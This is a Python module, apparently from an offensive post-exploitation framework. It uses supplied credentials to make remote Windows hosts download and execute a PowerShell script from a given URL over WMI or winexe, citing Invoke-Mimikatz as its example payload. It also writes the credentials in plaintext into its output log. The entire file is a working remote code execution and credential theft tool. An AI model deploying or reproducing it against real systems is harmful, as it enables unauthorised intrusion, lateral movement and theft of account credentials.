"""

Trigger a host to download/execute a specific powershell script at a
url (http or http), and optionally supply intial arguments 
to pass to the script.

This can be used to invoke any hosted Powersploit scripts
    https://github.com/mattifestation/PowerSploit/

    I.E. https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1


TODO: programatic way to specify output file and retrieve it

"""

import time

import settings
from lib import delivery_methods
from lib import helpers
from lib import smb


class Module:
    
    def __init__(self, targets=None, creds=None, args=None):

        self.name = "Invoke-Script"
        self.description = ("Download and invoke a powershell script hosted at a particular URL.")

        # internal list() that holds one or more targets set by the framework
        self.targets = targets

        # internal list() that holds one or more cred tuples set by the framework
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # any relevant text to echo to the output file
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "trigger_method"    :   ["wmis", "[wmis] or [winexe] for triggering"],
                                    "url"               :   ["", "the full url of the hosted script"],
                                    "script_args"       :   ["none", "initial arguments for the script"],
                                    "out_file"          :   ["out.txt", "file name to save script results"]}

    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        trigger_method = self.required_options["trigger_method"][0]
        url = self.required_options["url"][0]
        script_args = self.required_options["script_args"][0]
        out_file = self.required_options["out_file"][0]

        # the temporary output file gpp-password will write to
        if "\\" not in out_file:
            # otherwise assume it's an absolute path
            out_file = "C:\\Windows\\Temp\\" + out_file 

        if script_args == "none":
            script_args = ""
            
        # trigger the powershell invoke command with the given url
        delivery_methods.powershellTrigger(self.targets, username, password, url, scriptArguments=script_args, triggerMethod=trigger_method, outFile=out_file)

        for target in self.targets:
            self.output += "[*] Powershell script at "+url+" with arguments '"+script_args+"' triggered using creds '"+username+":"+password+"' on "+target+" using "+trigger_method+"\n"
